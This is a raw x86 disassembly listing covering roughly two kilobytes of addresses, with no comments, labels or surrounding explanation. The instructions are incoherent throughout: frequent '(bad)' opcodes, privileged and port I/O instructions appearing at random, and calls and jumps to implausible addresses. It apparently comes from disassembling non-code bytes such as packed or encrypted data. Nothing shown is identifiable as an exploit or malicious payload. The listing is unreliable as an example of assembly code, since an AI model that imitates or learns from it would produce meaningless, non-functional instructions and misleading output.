  4305e5:	clc    
  4305e6:	add    eax,ebx
  4305e8:	loopne 0x4305b5
  4305ea:	dec    ebp
  4305eb:	into   
  4305ec:	mov    al,dh
  4305ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4305f4:	inc    ebp
  4305f5:	push   ebp
  4305f6:	mov    ebp,DWORD PTR [ebx]
  4305f8:	in     al,dx
  4305f9:	cmp    eax,ebx
  4305fb:	ja     0x430642
  4305fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430603:	inc    ebp
  430604:	fwait
  430605:	mov    esi,DWORD PTR [edx]
  430607:	clc    
  430608:	mov    bl,al
  43060a:	xlat   BYTE PTR ds:[ebx]
  43060b:	retf   
  43060c:	inc    ebp
  43060d:	into   
  43060e:	mov    eax,esi
  430610:	in     al,dx
  430611:	scas   eax,DWORD PTR es:[edi]
  430612:	retf   
  430613:	mov    ecx,DWORD PTR [ebp-0x38]
  430616:	mov    edx,DWORD PTR [ebp-0x24]
  430619:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430620:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430627:	mov    eax,DWORD PTR [ebx]
  430629:	clc    
  43062a:	loopne 0x4305ef
  43062c:	push   ebp
  43062d:	retf   
  43062e:	mov    dh,al
  430630:	adc    esi,ecx
  430632:	jb     0x4305e3
  430634:	add    BYTE PTR [ebx+0x558bc845],cl
  43063a:	in     al,dx
  43063b:	sub    eax,ebx
  43063d:	cmp    ecx,ebx
  43063f:	mov    eax,esi
  430641:	mov    esp,0x45af03ce
  430646:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43064c:	mov    eax,ebx
  43064e:	in     al,dx
  43064f:	into   
  430650:	dec    ebp
  430651:	(bad)  
  430652:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430658:	rol    DWORD PTR [ebp+0x4d],0x89
  43065c:	xor    esp,esp
  43065e:	sub    eax,DWORD PTR [ebp-0x75]
  430661:	add    ebp,esp
  430663:	mov    al,0x55
  430665:	inc    ebp
  430666:	xor    esi,DWORD PTR [ecx]
  430668:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43066f:	inc    ebp
  430670:	xor    esi,DWORD PTR [edx]
  430672:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430679:	test   DWORD PTR [eax],eax
  43067b:	clc    
  43067c:	enter  0x8645,0x33
  430680:	inc    DWORD PTR [ebx]
  430682:	(bad)  
  430683:	jmp    0x4306ca
  430685:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43068b:	inc    ebp
  43068c:	(bad)  
  43068d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430693:	fwait
  430694:	retf   
  430695:	xor    al,cl
  430697:	mov    BYTE PTR [ebp+0xb],cl
  43069a:	lea    eax,[ebp+0x8]
  43069d:	xor    esi,DWORD PTR [edx+0x3]
  4306a0:	add    al,ah
  4306a2:	inc    ebp
  4306a3:	dec    ebp
  4306a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4306aa:	gs add ch,cl
  4306ad:	inc    ebp
  4306ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4306b4:	inc    ebp
  4306b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4306bb:	push   ebp
  4306bc:	(bad)  
  4306bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4306c3:	add    ch,ch
  4306c5:	inc    ebp
  4306c6:	dec    DWORD PTR [ebx-0x34332775]
  4306cc:	add    al,0x4d
  4306ce:	inc    ebp
  4306cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4306d5:	fwait
  4306d6:	add    DWORD PTR [edx],esi
  4306d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4306de:	push   DWORD PTR [ebx]
  4306e0:	int3   
  4306e1:	xor    eax,DWORD PTR [eax]
  4306e3:	add    edx,DWORD PTR [eax+0x3]
  4306e6:	mov    DWORD PTR [edi],ecx
  4306e8:	call   0x4288c7ae
  4306ed:	mov    DWORD PTR [ebp-0x20],esp
  4306f0:	add    BYTE PTR [ebp+0x7d],al
  4306f3:	mov    eax,DWORD PTR [eax]
  4306f5:	in     al,0x15
  4306f7:	ret    
  4306f8:	iret   
  4306f9:	(bad)  
  4306fa:	enter  0x14af,0x8b
  4306fe:	(bad)  
  4306ff:	in     al,dx
  430700:	or     bl,cl
  430702:	adc    cl,al
  430704:	push   ebp
  430705:	dec    ebp
  430706:	inc    eax
  430707:	mov    edx,DWORD PTR [ebp-0x20]
  43070a:	jb     0x4306d7
  43070c:	mov    ecx,esi
  43070e:	cld    
  43070f:	scas   eax,DWORD PTR es:[edi]
  430710:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430717:	mov    BYTE PTR [eax],0x8c
  43071a:	push   0xffffff9b
  43071c:	push   edi
  43071d:	xor    dl,BYTE PTR [eax+0x3b]
  430720:	mov    ecx,DWORD PTR [edi]
  430722:	call   0x8c424c85
  430727:	mov    eax,eax
  430729:	in     al,dx
  43072a:	jge    0x430779
  43072c:	mov    DWORD PTR [ebx],esi
  43072e:	int3   
  43072f:	add    eax,DWORD PTR [ebp+0xf]
  430732:	xor    eax,ecx
  430734:	(bad)  
  430735:	dec    ebp
  430736:	pushf  
  430737:	xor    ecx,esi
  430739:	add    edi,DWORD PTR [edi]
  43073b:	mov    eax,DWORD PTR [ebp-0x38]
  43073e:	(bad)  
  43073f:	test   dh,dl
  430741:	fwait
  430742:	add    esi,DWORD PTR [edx]
  430744:	jmp    0x4306cf
  430746:	mov    cl,al
  430748:	add    eax,0x14330f45
  43074d:	mov    ecx,0xff468d80
  430752:	jmp    0xc990171f
  430757:	mov    edx,ecx
  430759:	rol    BYTE PTR [ebp+0x330155],1
  43075f:	add    ecx,DWORD PTR [ebp+0xf]
  430762:	xor    eax,edx
  430764:	(bad)  
  430765:	ror    DWORD PTR [eax],0x86
  430768:	jb     0x430767
  43076a:	add    bh,bh
  43076c:	clc    
  43076d:	inc    ebp
  43076e:	jb     0x4307da
  430770:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430776:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43077c:	shr    BYTE PTR [eax-0x3d],0x30
  430780:	clc    
  430781:	add    BYTE PTR [ebp+0x75],al
  430784:	xor    DWORD PTR [edx-0x64],ebp
  430787:	inc    edi
  430789:	adc    al,0xe8
  43078b:	inc    ebp
  43078c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430792:	mov    ecx,DWORD PTR [eax]
  430794:	cld    
  430795:	or     DWORD PTR [ebp-0x34],0x33
  430799:	jbe    0x43079e
  43079b:	mov    edx,DWORD PTR [ecx+0x2b]
  43079e:	dec    ebp
  43079f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4307a5:	mov    BYTE PTR [ebx],dh
  4307a7:	mov    eax,DWORD PTR [ebx]
  4307a9:	or     BYTE PTR [ecx+0x3b],dl
  4307ac:	dec    ebp
  4307ad:	int3   
  4307ae:	xor    ebp,edi
  4307b0:	add    eax,DWORD PTR [ebp+0x51]
  4307b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4307b6:	xor    eax,DWORD PTR [eax]
  4307b8:	add    ebp,DWORD PTR [eax+0x51]
  4307bb:	adc    BYTE PTR [eax+0x0],0x8b
  4307bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4307c5:	inc    ebp
  4307c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4307cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4307d2:	dec    ebp
  4307d3:	mov    esi,DWORD PTR [ebx]
  4307d5:	hlt    
  4307d6:	add    eax,ebx
  4307d8:	push   ecx
  4307d9:	inc    ebp
  4307da:	dec    ebp
  4307db:	(bad)  
  4307dc:	call   esi
  4307de:	in     al,0xc7
  4307e0:	retf   
  4307e1:	mov    al,ds:0xc5ff3dce
  4307e6:	adc    al,0xc6
  4307e8:	inc    ebp
  4307e9:	and    eax,0x9c0f4c85
  4307ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4307f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4307f9:	mov    dh,0xc7
  4307fb:	cmp    eax,eax
  4307fd:	jne    0x45440049
  430803:	mov    esi,DWORD PTR [ebx]
  430805:	mov    eax,0x848bcb9c
  43080a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430811:	or     BYTE PTR [edi],cl
  430813:	(bad)  
  430814:	dec    ebp
  430815:	inc    edi
  430816:	add    bh,0x54
  430819:	or     cl,ch
  43081b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430821:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430828:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43082e:	(bad)  
  43082f:	cmp    eax,0x89839cff
  430834:	je     0x43081a
  430836:	inc    DWORD PTR [ebp+0x0]
  430839:	mov    ecx,DWORD PTR [ebp-0x340018]
  43083f:	into   
  430840:	dec    DWORD PTR [ebx-0x7f72431c]
  430846:	push   0x5000ff01
  43084b:	retf   
  43084c:	inc    ebp
  43084d:	into   
  43084e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430854:	push   eax
  430855:	into   
  430856:	call   0x4b0ce6
  43085b:	retf   
  43085c:	add    dh,cl
  43085e:	add    bh,bh
  430860:	mov    DWORD PTR [eax+ecx*1],edx
  430863:	clc    
  430864:	inc    ebp
  430865:	inc    ebp
  430866:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43086c:	push   0x1
  43086e:	push   edi
  43086f:	add    BYTE PTR [eax-0x35],dl
  430872:	mov    ecx,esi
  430874:	cld    
  430875:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43087b:	into   
  43087c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430883:	xor    eax,DWORD PTR [ebp+0x3]
  430886:	jne    0x4308d9
  430888:	call   DWORD PTR [eax-0x3c]
  43088b:	mov    DWORD PTR [ecx-0x18],edx
  43088e:	mov    edi,edi
  430890:	call   0x8b464e19
  430895:	add    ah,ah
  430897:	rol    BYTE PTR [ebp-0x7c],0xeb
  43089b:	add    edi,edi
  43089d:	add    al,ch
  43089f:	inc    ebp
  4308a0:	push   ecx
  4308a1:	cmp    al,0x8b
  4308a3:	pushf  
  4308a4:	(bad)  
  4308a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4308ac:	test   DWORD PTR [ebp-0x8],ecx
  4308af:	add    BYTE PTR [ebp+0x54],0x32
  4308b3:	jmp    0x8bcc9154
  4308b8:	in     al,dx
  4308b9:	or     BYTE PTR [ebp-0xf],al
  4308bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4308c2:	hlt    
  4308c3:	mov    eax,DWORD PTR [ebp-0x50]
  4308c6:	xor    esi,ecx
  4308c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4308ce:	inc    ebp
  4308cf:	adc    ecx,0x68
  4308d2:	pushf  
  4308d3:	inc    edi
  4308d5:	add    al,ch
  4308d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308d8:	test   edi,edi
  4308da:	clc    
  4308db:	inc    DWORD PTR [ebp-0x73]
  4308de:	cmp    al,0x74
  4308e0:	pushf  
  4308e1:	inc    edi
  4308e3:	push   ecx
  4308e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308e5:	jne    0x43086c
  4308e7:	push   eax
  4308e8:	clc    
  4308e9:	test   DWORD PTR [ebp-0x1],eax
  4308ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4308f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4308fa:	cmp    BYTE PTR [edx],bl
  4308fc:	pushf  
  4308fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430903:	add    BYTE PTR [ebx],dh
  430905:	inc    ebp
  430906:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  43090c:	enter  0x8401,0x0
  430910:	add    al,BYTE PTR [eax]
  430912:	add    bh,bh
  430914:	out    dx,eax
  430915:	sbb    BYTE PTR [eax],al
  430917:	dec    ebp
  430918:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43091e:	sub    esi,DWORD PTR [ebx]
  430920:	mov    ebp,DWORD PTR [eax-0x8]
  430923:	add    bl,0x0
  430926:	(bad)  
  430927:	cmp    eax,ecx
  430929:	or     BYTE PTR [edx+0x750114],al
  43092f:	inc    DWORD PTR [ebp+0x18]
  430932:	mov    eax,DWORD PTR [ebp-0x8]
  430935:	mov    ebx,eax
  430937:	(bad)  
  430938:	retf   
  430939:	inc    ebp
  43093a:	into   
  43093b:	mov    esi,eax
  43093d:	int3   
  43093e:	scas   eax,DWORD PTR es:[edi]
  43093f:	push   es
  430940:	mov    esi,DWORD PTR [ebp-0xc]
  430943:	call   DWORD PTR [ebp+0x18]
  430946:	sub    edi,DWORD PTR [ebp+0x3b]
  430949:	mov    esi,DWORD PTR [edi-0x34]
  43094c:	mov    eax,DWORD PTR [ebp-0x8]
  43094f:	xor    ebx,eax
  430951:	pushf  
  430952:	mov    bh,0xbc
  430955:	fadd   QWORD PTR [eax]
  430957:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  43095d:	mov    esi,DWORD PTR [ebx]
  43095f:	in     al,0x33
  430961:	ret    
  430962:	add    eax,esi
  430964:	add    eax,DWORD PTR [ebp+0xf]
  430967:	mov    eax,ecx
  430969:	in     al,0x4d
  43096b:	ret    
  43096c:	mov    eax,esi
  43096e:	in     al,dx
  43096f:	inc    ebp
  430970:	rol    edi,1
  430972:	sar    al,1
  430974:	or     BYTE PTR [ebp+0x45e9f845],al
  43097a:	add    BYTE PTR [ebx],dh
  43097c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430983:	test   ebx,eax
  430985:	clc    
  430986:	retf   
  430987:	inc    ebp
  430988:	into   
  430989:	cmp    eax,0xc7af9cc6
  43098e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430995:	inc    ebp
  430996:	cmp    edi,DWORD PTR [edi]
  430998:	ja     0x430936
  43099a:	mov    eax,edi
  43099c:	mov    esp,0x458567a8
  4309a1:	clc    
  4309a2:	mov    eax,DWORD PTR [ebp-0x8]
  4309a5:	mov    eax,ebx
  4309a7:	in     al,dx
  4309a8:	retf   
  4309a9:	ret    
  4309aa:	into   
  4309ab:	mov    dh,0x7d
  4309ae:	scas   eax,DWORD PTR es:[edi]
  4309af:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4309b5:	add    BYTE PTR [ebx],ch
  4309b7:	jmp    0xba0af7
  4309bc:	mov    eax,DWORD PTR [ebp-0x5c]
  4309bf:	mov    eax,DWORD PTR [ebp-0x14]
  4309c2:	inc    ebp
  4309c3:	enter  0x458b,0xf8
  4309c7:	xor    eax,ebx
  4309c9:	add    ecx,ebx
  4309cb:	cmp    ecx,esi
  4309cd:	shufps xmm7,xmm4,0xaf
  4309d1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4309d7:	dec    ebp
  4309d8:	sub    esi,DWORD PTR [ebx]
  4309da:	cmp    esi,DWORD PTR [ebx]
  4309dc:	ja     0x4309e1
  4309de:	mov    eax,DWORD PTR [ebx]
  4309e0:	lods   al,BYTE PTR ds:[esi]
  4309e1:	mov    db0,ecx
  4309e4:	inc    ebp
  4309e5:	dec    ebp
  4309e6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4309ec:	retf   
  4309ed:	rol    dh,1
  4309ef:	or     al,0xce
  4309f1:	inc    ebp
  4309f2:	scas   eax,DWORD PTR es:[edi]
  4309f3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4309f9:	add    BYTE PTR [ebx],ch
  4309fb:	add    BYTE PTR [ebx],bh
  4309fd:	inc    ebp
  4309fe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430a04:	inc    ebp
  430a05:	retf   
  430a06:	mov    ecx,esi
  430a08:	clc    
  430a09:	(bad)  
  430a0a:	retf   
  430a0b:	scas   eax,DWORD PTR es:[edi]
  430a0c:	ret    
  430a0d:	mov    ecx,esi
  430a0f:	hlt    
  430a10:	(bad)  
  430a11:	push   ebp
  430a12:	scas   eax,DWORD PTR es:[edi]
  430a13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430a19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430a1f:	add    BYTE PTR [ebx],al
  430a21:	mov    eax,eax
  430a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a24:	inc    ebp
  430a25:	dec    ebp
  430a26:	xor    DWORD PTR [ebx],esi
  430a28:	pushf  
  430a29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430a2f:	rdmsr  
  430a31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430a39:	sar    eax,1
  430a3b:	rol    BYTE PTR [ebp+0x5],1
  430a3e:	xor    eax,DWORD PTR [ebp+0x3]
  430a41:	jmp    0x430a2e
  430a43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a49:	xor    eax,DWORD PTR [ebp+0x33]
  430a4c:	mov    eax,DWORD PTR [ebx]
  430a4e:	rol    BYTE PTR [ebx],1
  430a50:	test   BYTE PTR [edi],cl
  430a52:	fwait
  430a53:	shl    DWORD PTR [edx],0x4d
  430a56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430a5c:	xor    edx,eax
  430a5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430a64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430a6a:	add    BYTE PTR [ebx],dh
  430a6c:	inc    ebp
  430a6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430a73:	rdpmc  
  430a75:	rol    DWORD PTR [ebx],0x4d
  430a78:	loopne 0x430a05
  430a7a:	push   ebp
  430a7b:	in     al,dx
  430a7c:	mov    cl,dl
  430a7e:	adc    eax,edx
  430a80:	jb     0x430a87
  430a82:	add    BYTE PTR [ebp+0x45],al
  430a85:	jmp    0x430a12
  430a87:	mov    ebx,eax
  430a89:	test   al,0xcb
  430a8b:	dec    ebp
  430a8c:	dec    ebp
  430a8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430a93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430a99:	dec    ebp
  430a9a:	mov    al,0x8b
  430a9c:	dec    ebp
  430a9d:	in     al,dx
  430a9e:	xor    edx,ecx
  430aa0:	xor    edx,eax
  430aa2:	add    eax,DWORD PTR [ebp+0x3]
  430aa5:	jbe    0x430ab6
  430aa7:	mov    eax,ecx
  430aa9:	test   al,0x45
  430aab:	dec    ebp
  430aac:	mov    DWORD PTR [ebx],esi
  430aae:	loopne 0x430ae3
  430ab0:	inc    ebp
  430ab1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430ab7:	rol    esi,0x45
  430aba:	scas   eax,DWORD PTR es:[edi]
  430abb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430ac1:	mov    eax,ecx
  430ac3:	hlt    
  430ac4:	dec    ebp
  430ac5:	inc    ebp
  430ac6:	mov    eax,edi
  430ac8:	loopne 0x430aa2
  430aca:	retf   
  430acb:	test   esi,ecx
  430acd:	clc    
  430ace:	scas   eax,DWORD PTR es:[edi]
  430acf:	inc    ebp
  430ad0:	mov    eax,edi
  430ad2:	fdiv   st,st(0)
  430ad4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430ada:	fwait
  430adb:	xor    esi,DWORD PTR [edx]
  430add:	pushf  
  430ade:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430ae4:	inc    esi
  430ae6:	mov    ebp,DWORD PTR [eax-0x10]
  430ae9:	inc    ebp
  430aea:	dec    ebp
  430aeb:	xor    esi,DWORD PTR [ebx]
  430aed:	add    eax,DWORD PTR [ebx]
  430aef:	loopne 0x430b00
  430af1:	dec    ebp
  430af2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430af9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430aff:	lock fwait
  430b01:	ret    
  430b02:	xor    al,BYTE PTR [ebp-0x77]
  430b05:	mov    esi,esp
  430b07:	rol    BYTE PTR [ebp-0x7c],1
  430b0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430b10:	call   edi
  430b12:	enter  0x4d45,0x8b
  430b16:	mov    esi,eax
  430b18:	fmul   st(3),st
  430b1a:	push   ebp
  430b1b:	dec    ebp
  430b1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b22:	ret    0xc19b
  430b25:	xor    al,BYTE PTR [esi-0x280276]
  430b2b:	dec    ebp
  430b2c:	jne    0x430b61
  430b2e:	mov    eax,DWORD PTR [ebx]
  430b30:	cld    
  430b31:	loopne 0x430ae3
  430b33:	push   ebp
  430b34:	add    DWORD PTR [eax+0x72851100],ecx
  430b3a:	inc    DWORD PTR [eax]
  430b3c:	inc    DWORD PTR [ebp-0x75]
  430b3f:	mov    edi,esp
  430b41:	lock add bl,0x1
  430b45:	retf   
  430b46:	add    dh,al
  430b48:	xor    dh,cl
  430b4a:	inc    ebp
  430b4b:	scas   eax,DWORD PTR es:[edi]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	shl    al,0x0
  430b51:	inc    ebp
  430b52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b58:	call   0x461e90
  430b5d:	ud0    eax,ecx
  430b60:	adc    al,0x4d
  430b62:	inc    ebp
  430b63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430b69:	lock push 0x338055
  430b6f:	add    eax,DWORD PTR [eax]
  430b71:	ud0    ecx,edx
  430b74:	sbb    BYTE PTR [ebp+0x5e],dl
  430b77:	xor    ecx,ecx
  430b79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430b80:	push   ecx
  430b81:	add    BYTE PTR [ebp-0x38],cl
  430b84:	mov    DWORD PTR [esi-0x740004],eax
  430b8a:	cld    
  430b8b:	inc    ebp
  430b8c:	jmp    0x430b19
  430b8e:	mov    esp,esp
  430b90:	mov    ebx,eax
  430b92:	mov    eax,esi
  430b94:	clc    
  430b95:	scas   eax,DWORD PTR es:[edi]
  430b96:	icebp  
  430b97:	mov    esi,DWORD PTR [ebp-0x28]
  430b9a:	(bad)  
  430b9b:	retf   
  430b9c:	or     ecx,eax
  430b9e:	(bad)  
  430b9f:	dec    ebp
  430ba0:	pop    es
  430ba1:	(bad)  
  430ba2:	(bad)  
  430ba3:	or     BYTE PTR [esi],al
  430ba5:	jb     0x430b6d
  430ba7:	add    BYTE PTR [ebx],al
  430ba9:	inc    ebp
  430baa:	(bad)  
  430bab:	mov    ecx,DWORD PTR [edx]
  430bad:	fadd   st(6),st
  430baf:	ret    
  430bb0:	add    ah,BYTE PTR [ebp-0x37]
  430bb3:	int    0x55
  430bb5:	sub    ebp,esp
  430bb7:	add    edx,DWORD PTR [ecx-0x14]
  430bba:	inc    ebp
  430bbb:	inc    ebp
  430bbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bc2:	cld    
  430bc3:	(bad)  
  430bc4:	(bad)  
  430bc5:	scas   eax,DWORD PTR es:[edi]
  430bc6:	loopne 0x430c03
  430bc8:	mov    DWORD PTR [edi],ecx
  430bca:	mov    ebp,ebp
  430bcc:	clc    
  430bcd:	push   eax
  430bcf:	push   DWORD PTR [ebp-0x4]
  430bd2:	mov    BYTE PTR [ebp+0xa],0xff
  430bd6:	(bad)  
  430bd7:	int3   
  430bd8:	or     BYTE PTR [eax],al
  430bda:	(bad)  
  430bdb:	lea    eax,[edi]
  430bdd:	ins    BYTE PTR es:[edi],dx
  430bde:	(bad)  
  430bdf:	inc    DWORD PTR [ecx]
  430be1:	push   eax
  430be2:	mov    BYTE PTR [ebp+0x9],0x8b
  430be6:	leave  
  430be7:	les    edx,FWORD PTR [ebp+0x0]
  430bea:	in     al,dx
  430beb:	call   DWORD PTR [ecx-0x75]
  430bee:	inc    ebp
  430bef:	cld    
  430bf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430bf6:	cld    
  430bf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430bfd:	pop    es
  430bfe:	mov    eax,DWORD PTR [eax]
  430c00:	clc    
  430c01:	test   eax,esi
  430c03:	je     0x430c7a
  430c05:	mov    eax,esi
  430c07:	cld    
  430c08:	add    al,0x80
  430c0a:	add    WORD PTR [ecx+0x0],ax
  430c0e:	fiadd  DWORD PTR [eax]
  430c10:	mov    BYTE PTR [eax],0x3d
  430c13:	push   0xffffffc3
  430c15:	push   edi
  430c16:	mov    edx,DWORD PTR [eax+0x51]
  430c19:	pop    edi
  430c1a:	lea    ebx,[ebx-0x8]
  430c1d:	ret    0x45
  430c20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c26:	xchg   eax,edi
  430c28:	mov    DWORD PTR [ebp-0x75],ecx
  430c2b:	push   esi
  430c2c:	clc    
  430c2d:	jne    0x430bff
  430c2f:	mov    ecx,0xf8450b0b
  430c34:	(bad)  
  430c35:	push   cs
  430c36:	or     BYTE PTR [ebp-0x3a],dh
  430c39:	cmp    eax,DWORD PTR [ecx]
  430c3b:	pop    esi
  430c3c:	(bad)  
  430c3d:	or     al,0x5
  430c3f:	inc    eax
  430c40:	leave  
  430c41:	jmp    0x40cf:0x25564204
  430c48:	leave  
  430c49:	in     eax,dx
  430c4a:	inc    DWORD PTR [eax-0x75]
  430c4d:	fimul  DWORD PTR [ebx-0x228139be]
  430c53:	inc    eax
  430c54:	nop
  430c55:	loopne 0x430c56
  430c57:	ret    
  430c58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c5e:	add    eax,0xff45e8f8
  430c63:	push   esi
  430c64:	push   DWORD PTR [ebp-0x39]
  430c67:	mov    eax,0x7edda46
  430c6c:	or     al,0x6
  430c6e:	push   DWORD PTR [ebp-0x3a]
  430c71:	cmp    eax,DWORD PTR [edx]
  430c73:	pop    esi
  430c74:	ret    
  430c75:	or     al,0x56
  430c77:	inc    ecx
  430c78:	push   ebp
  430c79:	jle    0x430c67
  430c7b:	inc    edx
  430c7c:	inc    ebp
  430c7d:	int    0x1
  430c7f:	inc    ecx
  430c80:	sub    BYTE PTR ds:0xe77541fc,ah
  430c86:	add    DWORD PTR [edx+0x1c],eax
  430c89:	retf   0xc38b
  430c8c:	adc    al,0x8b
  430c8e:	xchg   edx,eax
  430c8f:	push   ecx
  430c90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c96:	rcl    DWORD PTR [esi-0x9],cl
  430c99:	jne    0x430ceb
  430c9b:	mov    eax,0x7c80ece
  430ca0:	rol    DWORD PTR [esi],cl
  430ca2:	div    DWORD PTR [ebp+0x50]
  430ca5:	cmp    ecx,edx
  430ca7:	pop    esi
  430ca8:	dec    BYTE PTR [edx]
  430caa:	in     al,dx
  430cab:	inc    edx
  430cac:	sub    esp,ecx
  430cae:	inc    eax
  430caf:	(bad)  
  430cb0:	push   eax
  430cb1:	add    edx,DWORD PTR [eax-0x1f]
  430cb4:	push   edi
  430cb5:	add    dh,dh
  430cb7:	leave  
  430cb8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cbc:	add    BYTE PTR [ecx+0x0],dl
  430cbf:	inc    ebp
  430cc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430ccc:	add    al,0x2
  430cce:	jmp    0x57eb828
  430cd3:	jne    0x430cbd
  430cd5:	mov    eax,DWORD PTR [edx]
  430cd7:	or     BYTE PTR [eax],al
  430cd9:	inc    ecx
  430cda:	stc    
  430cdb:	in     eax,dx
  430cdc:	ss inc eax
  430cde:	aas    
  430cdf:	out    0x7d,eax
  430ce1:	inc    ecx
  430ce2:	mov    ebp,ecx
  430ce4:	lock ret 0x7d
  430ce8:	and    ecx,DWORD PTR [ebx-0x171777]
  430cee:	add    bh,bh
  430cf0:	aad    0xd7
  430cf2:	add    dh,cl
  430cf4:	clts   
  430cf6:	(bad)  
  430cf7:	call   0xffce0bfc
  430cfc:	hlt    
  430cfd:	iret   
  430cfe:	jge    0x430cd6
  430d00:	rol    DWORD PTR [esi-0x80],cl
  430d03:	jmp    0x1c5c10
  430d08:	out    dx,al
  430d09:	mov    eax,DWORD PTR [ebx]
  430d0b:	(bad)  
  430d0c:	pop    esi
  430d0d:	push   es
  430d0e:	cmp    al,0xe8
  430d10:	sar    edi,0x8
  430d13:	inc    DWORD PTR [edi]
  430d15:	inc    esi
  430d16:	(bad)  
  430d17:	loopne 0x430d97
  430d19:	push   edi
  430d1a:	push   cs
  430d1b:	push   ebx
  430d1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430d22:	add    BYTE PTR [ebp+0x50],al
  430d25:	push   eax
  430d26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d2c:	sub    edx,DWORD PTR [esi-0x24]
  430d2f:	jne    0x430ce7
  430d31:	lods   eax,DWORD PTR ds:[esi]
  430d32:	mov    edx,DWORD PTR [edx-0x34]
  430d35:	dec    esi
  430d36:	out    0x83,eax
  430d38:	into   
  430d39:	push   edi
  430d3b:	loopne 0x430d0b
  430d3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d48:	rol    DWORD PTR [edx],0x8
  430d4b:	mov    esp,ecx
  430d4d:	cmp    DWORD PTR [ebx],0xc
  430d50:	mov    esi,0x5001c0
  430d55:	push   eax
  430d56:	push   cs
  430d57:	push   eax
  430d58:	(bad)  
  430d59:	sub    edx,edi
  430d5b:	push   esi
  430d5c:	adc    al,0xcb
  430d5e:	ins    DWORD PTR es:[edi],dx
